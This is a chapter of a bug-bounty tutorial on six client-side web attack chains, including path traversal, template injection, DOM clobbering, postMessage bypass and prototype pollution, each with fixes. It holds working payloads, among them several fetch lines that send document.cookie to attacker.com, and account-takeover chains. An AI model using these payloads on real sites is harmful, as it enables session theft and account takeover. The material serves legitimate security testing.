# 🖥️ Client-Side Attacks (Tricks #18–#23)

> ⚠️ **Disclaimer:** Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

Client-side bugs are often dismissed as "low severity" — until you chain them.
A lone open redirect or a self-XSS is worth little, but combined with an OAuth
flow or a JSON endpoint, they become full account takeover. These six tricks
cover the highest-value chains in modern front-end apps.

---

## Table of Contents

1. [Client-Side Path Traversal (CSPT) as a Gadget](#trick-18)
2. [Chain Open Redirect + CSPT for Account Takeover](#trick-19)
3. [Silent CSTI Payloads via constructor (no alert)](#trick-20)
4. [DOM Clobbering to Hijack Script Behavior](#trick-21)
5. [PostMessage Origin Bypass via null Origin](#trick-22)
6. [Prototype Pollution → XSS Chain](#trick-23)

---

<a name="trick-18"></a>
## 🧩 Trick #18 — Client-Side Path Traversal (CSPT) as a Gadget

**Category:** Client-Side
**Impact:** High (when chained)
**Tools:** Burp, browser DevTools

### The Idea
CSPT happens when front-end JavaScript inserts user input into a URL **path**
without sanitizing `../` sequences. Alone it just fetches the wrong path — but
chained with an open redirect or a JSON endpoint, it becomes a powerful
client-side gadget.

### Vulnerable Patterns

```javascript
fetch(`/api/users/${userId}/profile`)
fetch(`/api/messages/${msgId}/read`)
new URL(`/static/${filename}`, location.origin)
axios.get(`/v1/orders/${orderId}`)
```

If `userId` comes from a URL parameter, an attacker controls the path.

### Example

**Original request:**
```
GET /api/users/1337/profile
```

**Attacker-controlled input:**
```
userId = ../../admin
```

**Resulting fetch:**
```
GET /api/admin/profile
```

### Steps

1. **Find user-controlled inputs reflected in fetch URLs:**
   - Query params
   - Path segments
   - `?redirect=`, `?next=`, `?id=`, `?file=`

2. **Inject traversal sequences:**
   ```
   ../../
   ..%2f..%2f
   ....//
   %2e%2e%2f
   ```

3. **Observe where the request goes** in DevTools Network tab.

4. **Look for interesting sinks:**
   - Admin endpoints
   - Internal APIs (`/api/internal/...`)
   - Static JSON files containing config

### Why It Works
- Front-end treats user input as trusted path segments.
- Browsers normalize `../` client-side before sending.
- The server sees a clean path — no filter triggers.

### Fix
- Encode path segments: `encodeURIComponent(userId)`.
- Validate against expected format (UUID, numeric ID).
- Use query params instead of path segments for user data.
- Server-side: reject paths containing `..`.

---

<a name="trick-19"></a>
## 🧩 Trick #19 — Chain Open Redirect + CSPT for Account Takeover

**Category:** Client-Side Chain
**Impact:** Critical (ATO)
**Tools:** Burp, interactsh, custom JSON host

### The Idea
CSPT lets you redirect a fetch to an attacker-controlled URL. If that fetch
feeds data into a sensitive sink (profile update, password reset, OAuth
callback), you can force the victim's browser to send attacker-controlled
data — leading to ATO.

### Setup

1. **Find an open redirect:**
   ```
   /redirect?url=https://evil.com
   ```

2. **Find a CSPT sink:**
   ```javascript
   fetch(`/api/user/${userId}/avatar`) // userId from URL
   ```

3. **Host a JSON payload** on your server:
   ```json
   {
     "email": "attacker@evil.com",
     "verified": true
   }
   ```

4. **Craft the CSPT input:**
   ```
   userId = ../../../redirect?url=https://evil.com/payload.json
   ```

5. **Resulting fetch:**
   ```
   GET /api/user/../../../redirect?url=https://evil.com/payload.json/avatar
   ```
   → browser follows redirect → fetches attacker JSON.

6. **Victim's browser processes** attacker JSON as if it were their own
   profile → attacker's email is now bound to victim's account.

### Steps to Prove Impact

1. Create a victim test account you control.
2. Send the crafted URL to it.
3. Observe:
   - Attacker-controlled data written to victim profile
   - Password reset now goes to attacker
   - Full ATO confirmed

### Why It Works
- Open redirect bypasses same-origin trust.
- CSPT forces the path.
- The app trusts the JSON it fetches.

### Fix
- Fix the open redirect (allowlist redirect targets).
- Fix CSPT (encode path segments).
- CSRF tokens on state-changing fetches.
- Never trust fetched JSON as user identity.

---

<a name="trick-20"></a>
## 🧩 Trick #20 — Silent CSTI Payloads via constructor (no alert)

**Category:** Client-Side Template Injection
**Impact:** High
**Tools:** Burp, browser DevTools

### The Idea
When testing Client-Side Template Injection in Vue, Angular, or similar
frameworks, using `alert()` is noisy — it disrupts real users if the injection
is stored. Use **silent payloads** that log to console or exfiltrate via a
network request.

### Payloads

**Vue (silent):**
```
{{constructor.constructor('console.log(1)')()}}
{{constructor.constructor('fetch("//attacker.com/"+document.cookie)')()}}
{{_c.constructor('alert(1)')()}}
```

**Angular (sandbox-escaped silent):**
```
{{constructor.constructor('fetch("/log?x="+document.cookie)')()}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**React (JSX injection):**
```
{(()=>{fetch('//attacker.com/'+document.cookie); return null})()}
```

**General:**
```
${constructor.constructor('fetch("//attacker.com/"+document.cookie)')()}
#{constructor.constructor('fetch("//attacker.com/"+document.cookie)')()}
<%= constructor.constructor('fetch("//attacker.com/"+document.cookie)')() %>
```

### Why "Silent"?

- `alert()` blocks the page and is visible to any user who triggers the
  injection — bad for stored CSTI.
- `console.log()` is invisible unless DevTools is open.
- `fetch()` exfiltrates data without any UI change.

### Steps

1. **Inject payload** into any template-rendered input.
2. **Watch interactsh / your listener** for the callback.
3. **Confirm code execution** by reading the exfiltrated data.

### Fix
- Never render user input in templates.
- Use `v-text` / `[innerText]` in Vue/Angular instead of `{{ }}`.
- Sanitize on input AND output.
- Content Security Policy (CSP) with `script-src 'self'`.

---

<a name="trick-21"></a>
## 🧩 Trick #21 — DOM Clobbering to Hijack Script Behavior

**Category:** Client-Side
**Impact:** High
**Tools:** Burp, browser DevTools

### The Idea
DOM clobbering abuses named HTML elements to override global variables.
If JavaScript does `if (window.config)` or reads `document.getElementById('x')`
without `?.`, you can inject HTML that **becomes** that variable.

### Payloads

**Override a global:**
```html
<form id="config">
  <input name="url" value="https://evil.com">
</form>
```
Now `window.config.url` = `https://evil.com`.

**Nested clobbering:**
```html
<form id="config" name="config">
  <input name="url" value="https://evil.com">
  <input name="api" value="//attacker.com">
</form>
```

**Override document properties:**
```html
<img name="location">
<a id="location" href="https://evil.com/xss">
```

**Clobber `document.getElementById`:**
```html
<iframe name="getElementById"></iframe>
```

### Exploitation Chain

1. **Find JS that reads a global or DOM element:**
   ```javascript
   if (window.config.api) {
     fetch(window.config.api + '/user');
   }
   ```

2. **Inject HTML that defines `config.api`:**
   ```html
   <form id="config"><input name="api" value="//attacker.com"></form>
   ```

3. **Result:** fetch goes to `//attacker.com/user` → attacker steals token.

### Steps

1. **Look for HTML injection sinks:**
   - Comment fields
   - Profile "bio"
   - Rich text inputs
   - Markdown renderers

2. **Inject form/img clobbering payloads.**

3. **Check DevTools console** for `window.<name>` values.

4. **Chain with the script that uses the clobbered value.**

### Why It Works
Browsers expose `id` / `name` attributes as named properties on `window` and
`document`. Scripts assuming these are undefined get attacker-controlled values.

### Fix
- Use `document.querySelector` with explicit selectors.
- Use `?.` optional chaining.
- Namespace globals to avoid collision.
- Sanitize HTML on input (strip `<form>`, `<img name>`, `<iframe name>`).

### References
- [PortSwigger: DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)

---

<a name="trick-22"></a>
## 🧩 Trick #22 — PostMessage Origin Bypass via null Origin

**Category:** Client-Side
**Impact:** High
**Tools:** Burp, browser DevTools

### The Idea
Sandboxed iframes and `data:` / `file:` URLs have a `null` origin. If the
target's `postMessage` listener checks `event.origin === 'null'` — or worse,
checks nothing — any sandboxed iframe can send messages to it.

### Vulnerable Listener Patterns

```javascript
// VULNERABLE: accepts null origin
window.addEventListener('message', (e) => {
  if (e.origin === 'null') {
    handle(e.data);
  }
});

// VULNERABLE: accepts everything
window.addEventListener('message', (e) => {
  handle(e.data);
});

// VULNERABLE: string-based origin check
window.addEventListener('message', (e) => {
  if (e.origin.startsWith('https://target.com')) {
    handle(e.data);
  }
});
```

### Exploit

**Attacker page:**
```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
  parent.postMessage({action:'setEmail', email:'attacker@evil.com'}, '*');
</script>"></iframe>
```

Or embed the target in your page:
```html
<iframe src="https://target.com/widget"></iframe>
<script>
  document.querySelector('iframe').onload = () => {
    document.querySelector('iframe').contentWindow.postMessage(
      {action: 'updateProfile', email: 'attacker@evil.com'},
      '*'
    );
  };
</script>
```

### Steps

1. **Find postMessage listeners:**
   - Search JS for `addEventListener('message'`
   - Search for `onmessage`

2. **Identify actions** the listener supports.

3. **Test with a malicious origin:**
   - If it accepts messages from anywhere → exploitable.
   - If it uses `startsWith` → try `target.com.attacker.com`.
   - If it accepts `null` → use sandboxed iframe.

4. **Chain with sensitive actions:**
   - Update email
   - Change password
   - Send money
   - Read tokens

### Why It Works
`null` origin is trivially spoofable via sandboxed iframes. Wildcard `*`
listeners accept anything. `startsWith` checks are easily bypassed with
subdomain tricks.

### Fix
- **Always** check `event.origin` against an exact allowlist.
- Never use `*` as targetOrigin for sensitive messages.
- Never accept `null` origin.
- Validate message schema, not just origin.

### References
- [PortSwigger: WebSockets and postMessage](https://portswigger.net/web-security/websockets)

---

<a name="trick-23"></a>
## 🧩 Trick #23 — Prototype Pollution → XSS Chain

**Category:** Client-Side Chain
**Impact:** Critical
**Tools:** Burp, browser DevTools

### The Idea
Prototype pollution lets you inject properties into `Object.prototype`. If
the app has any **gadget** — code that reads a property and injects it into
the DOM, `script.src`, or `innerHTML` — you turn pollution into XSS.

### Pollution Payloads

**URL-based:**
```
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
```

**JSON-based:**
```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
```

**Nested merge:**
```json
{"a": {"__proto__": {"polluted": "yes"}}}
```

### Common Gadgets

**jQuery `$.extend(true, {}, userInput)`:**
- Pollute `Object.prototype.src`
- Any `$('<script>').attr('src', ...)` triggers

**Lodash `_.merge`:**
```javascript
_.merge({}, JSON.parse(userInput));
```
- Pollute `__proto__.sourceURL` → DevTools injection
- Pollute `__proto__.src` for script loads

**Vue / React internals:**
- Pollute rendering props

**Gadget for XSS:**
```javascript
// If app does:
const el = document.createElement('script');
el.src = config.cdnUrl + '/app.js';
document.body.appendChild(el);

// Pollution:
{"__proto__": {"cdnUrl": "https://attacker.com"}}
// Result: <script src="https://attacker.com/app.js">
```

### Full Chain

1. **Find a merge/parse sink:** `Object.assign`, `$.extend`, `_.merge`,
   `JSON.parse` + recursive assign.

2. **Pollute `Object.prototype`** with a property name a gadget reads.

3. **Find the gadget:**
   - Search JS for `script.src =`
   - Search for `innerHTML =` with a config value
   - Search for `location.href =`

4. **Craft final payload** that combines pollution + gadget trigger.

### Steps

1. **Test for pollution:**
   ```javascript
   // In DevTools console after visiting polluted URL:
   console.log({}.polluted);
   // If "yes" → polluted
   ```

2. **Enumerate useful properties:**
   - `src`, `href`, `innerHTML`, `outerHTML`
   - `cdnUrl`, `apiUrl`, `debug`, `isAdmin`

3. **Chain with DOM sink** to achieve XSS.

### Why It Works
- JS merges don't skip `__proto__`.
- `Object.prototype` is shared by all objects.
- Any code reading a "missing" property gets the polluted value.

### Fix
- Use `Object.create(null)` for user-controlled data.
- Freeze `Object.prototype`.
- Strip `__proto__`, `constructor`, `prototype` keys.
- Use `Map` instead of plain objects.
- Modern libs (Lodash 4.17.21+) block pollution.

### References
- [PortSwigger: Prototype pollution](https://portswigger.net/web-security/prototype-pollution)

---

## 📌 Quick Reference Summary

| #  | Trick                       | Impact   | Effort |
|----|-----------------------------|----------|--------|
| 18 | CSPT gadget                 | High     | Low    |
| 19 | Open redirect + CSPT ATO    | Critical | Medium |
| 20 | Silent CSTI                 | High     | Low    |
| 21 | DOM clobbering              | High     | Low    |
| 22 | postMessage null origin     | High     | Low    |
| 23 | Prototype pollution → XSS   | Critical | Medium |

---

> **Prev:** [Race Conditions ←](03-race-conditions.md)
> **Next:** [Auth & Session →](05-auth-session.md)
